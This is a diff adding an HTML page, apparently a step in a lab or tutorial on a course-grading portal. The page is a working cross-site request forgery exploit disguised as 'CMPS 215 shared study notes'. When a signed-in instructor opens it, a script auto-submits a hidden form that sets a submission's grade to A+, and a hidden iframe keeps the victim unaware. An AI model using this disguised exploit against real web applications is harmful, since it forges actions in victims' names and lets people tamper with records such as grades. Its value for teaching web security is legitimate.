@@ -1,0 +1,19 @@
+<!doctype html>
+<!-- Step 16. Lina's page. When dr_haddad opens it while signed in to the portal,
+     his browser POSTs grade=A+ for submission 2. No click is needed: the script
+     submits the form on load. The form targets a hidden iframe, so the page he
+     sees does not change and nothing looks wrong. -->
+<html lang="en">
+<head><meta charset="utf-8"><title>CMPS 215 study notes</title></head>
+<body>
+  <h1>CMPS 215 - shared study notes</h1>
+  <p>Loading the notes...</p>
+
+  <form id="csrf" method="POST" action="http://127.0.0.1:5002/submissions/2/grade" target="sink">
+    <input type="hidden" name="grade" value="A+">
+  </form>
+  <iframe name="sink" style="display:none"></iframe>
+
+  <script>document.getElementById("csrf").submit();</script>
+</body>
+</html>
